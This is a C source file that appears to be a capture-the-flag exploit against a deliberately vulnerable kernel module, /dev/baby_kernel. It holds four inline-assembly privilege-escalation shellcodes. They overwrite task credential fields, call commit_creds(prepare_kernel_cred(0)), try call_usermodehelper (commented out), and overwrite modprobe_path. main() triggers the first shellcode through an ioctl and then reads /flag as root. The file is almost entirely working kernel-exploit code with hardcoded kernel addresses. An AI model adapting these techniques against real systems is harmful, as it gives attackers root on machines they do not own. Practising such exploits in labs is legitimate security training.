#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
// Invoke privilege escalation

#define BABY_KERNEL_IOCTL 0xffffffffc00000c0 // Put a breakpoint here to debug kernel panic, find address of ioctl running as root
#define PREPARE_KERNEL_CREDS 0xffffffff81094670
#define COMMIT_CREDS 0xffffffff810943d0
#define CALL_USERMODEHELPER 0xffffffff81086630
#define MODPROB 0xffffffff82851660

// First method: change user_id in task struct
void shellcode_1(){
    asm volatile(
        "mov rdi, gs:0x1AD00\n" // Offset to struct found with ida comparing with source code
        "mov rsi, [rdi+0x740]\n" // Offset to struct found with ida comparing with source code
        "mov QWORD PTR [rsi+0x8], 0\n" // To overwrite the user_id to 0 change everything in memory. It's randomized
        "mov QWORD PTR [rsi+0x10], 0\n"
        "mov QWORD PTR [rsi+0x18], 0\n"
        "mov QWORD PTR [rsi+0x20], 0\n"
    );
}

// Second method: prepare kernel creds, commit creds
// commit_creds(prepare_kernel_creds(0))
void shellcode_2(){
    asm volatile(
        "mov rdi, 0\n"
        "mov rax, 0xffffffff81094670\n"
        "call rax\n"
        "mov rdi, rax\n"
        "mov rax, 0xffffffff810943d0\n"
        "call rax\n"
    );
}

// change ownership of a file to be opened by user 1000
const char* argv[] = {"/bin/chown\0", "1000:1000\0", "/flag\0", NULL};

// Third method: call_usermodehelper
void shellcode_3(){
    /*
    asm volatile()
        "mov rdi, %0\n"
        "mov rsi, %1\n"
        "mov r10, 2\n"
        "mov rdx, 0\n"
        "mov rax %2\n"
        "call rax\n"
        :
        : "r"(argv[0]), "r"(argv), "r"(CALL_USERMODEHELPER)
        : "rdi", "rsi", "rdx", "r10", "rax"
    );
    */
}

// Fourth method: modprobe_path
void shellcode_4(){ 
    
    asm volatile(
        "mov rsi, 0xffffffff82851660\n"
        "mov rdi, 0x68732e612f\n"
        "mov QWORD PTR [rsi], rdi\n"
    );
    
}

int main(){
    int fd;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    fd = open("/dev/baby_kernel", O_RDWR);

    if(fd < 0){
        perror("open");
        return 1;
    }

    printf("File opened. fd = %d\n", fd);

    ioctl(fd, 1337, shellcode_1);

    // Now we are root
    close(fd);
    fd = open("/flag", O_RDONLY);
    char buf[0x100];
    read(fd, buf, sizeof(buf));
    printf("Flag: %s\n", buf);
}